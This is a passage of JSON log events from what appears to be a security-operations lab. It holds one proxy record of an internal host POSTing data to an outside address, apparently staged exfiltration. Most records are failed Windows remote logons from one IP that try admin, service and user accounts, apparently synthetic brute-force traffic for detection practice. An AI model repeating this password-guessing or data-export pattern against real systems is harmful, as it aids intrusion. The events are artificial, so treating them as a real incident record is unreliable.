    "event_id": "EVT-000726"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:30:00 3935 10.0.1.50 TCP_200/200 135 POST http://198.51.100.23/data - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 37,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:30:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "http://198.51.100.23/data",
      "bytes": 135,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000727"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:00",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:00Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"admin\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC000006A\", \"FailureReason\": \"An incorrect password was supplied\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"49588\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "admin",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "An incorrect password was supplied",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000728"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:01.114803",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:01.114803Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"dbadmin\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC000006A\", \"FailureReason\": \"An incorrect password was supplied\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"62570\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "dbadmin",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "An incorrect password was supplied",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000729"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:02.836112",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:02.836112Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"guest\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC0000064\", \"FailureReason\": \"The specified user does not exist\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"56962\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "guest",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "The specified user does not exist",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000730"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:03.639481",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:03.639481Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"jsmith\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC0000072\", \"FailureReason\": \"The user account is disabled\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"43338\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "jsmith",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "The user account is disabled",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000731"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:03.803871",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:03.803871Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"jsmith\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC0000234\", \"FailureReason\": \"The user account has been locked out\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"54242\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "jsmith",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "The user account has been locked out",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000732"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:03.868285",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:03.868285Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"jsmith\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC0000234\", \"FailureReason\": \"The user account has been locked out\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"59898\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "jsmith",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "The user account has been locked out",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000733"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:04.316040",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:04.316040Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"svc_backup\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC0000072\", \"FailureReason\": \"The user account is disabled\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"46411\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "svc_backup",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "The user account is disabled",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000734"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:06.343354",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:06.343354Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"sa\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC000006D\", \"FailureReason\": \"Bad username or authentication information\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"62439\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "sa",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "Bad username or authentication information",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000735"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:06.620926",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:06.620926Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"svc_backup\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC000006D\", \"FailureReason\": \"Bad username or authentication information\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"46818\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "svc_backup",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "Bad username or authentication information",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000736"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:08.642704",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:08.642704Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"svc_backup\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC000006D\", \"FailureReason\": \"Bad username or authentication information\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"53332\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "svc_backup",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "Bad username or authentication information",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000737"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:09.413970",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:09.413970Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"svc_backup\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC000006D\", \"FailureReason\": \"Bad username or authentication information\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"41743\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "svc_backup",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "Bad username or authentication information",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000738"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:09.423310",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:09.423310Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"administrator\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC0000064\", \"FailureReason\": \"The specified user does not exist\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"59049\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "administrator",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "The specified user does not exist",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000739"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T11:36:10.482195",
    "raw": "{\"EventID\": 4625, \"TimeCreated\": \"2026-02-17T11:36:10.482195Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Logon\", \"Keywords\": \"Audit Failure\", \"EventData\": {\"SubjectUserSid\": \"S-1-0-0\", \"SubjectUserName\": \"-\", \"SubjectDomainName\": \"-\", \"TargetUserName\": \"jsmith\", \"TargetDomainName\": \"CORPSEC\", \"Status\": \"0xC000006A\", \"FailureReason\": \"An incorrect password was supplied\", \"SubStatus\": \"0x0\", \"LogonType\": \"10\", \"LogonProcessName\": \"NtLmSsp\", \"AuthenticationPackageName\": \"NTLM\", \"WorkstationName\": \"WS-FIN-PC04\", \"IpAddress\": \"203.0.113.45\", \"IpPort\": \"59974\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "authentication_failure",
    "severity": "MEDIUM",
    "details": {
      "source_ip": "203.0.113.45",
      "username": "jsmith",
      "domain": "CORPSEC",
      "logon_type": "10",
      "failure_reason": "An incorrect password was supplied",
      "service": "windows_logon",
      "action": "failed_login"
    },
    "event_id": "EVT-000740"
  },
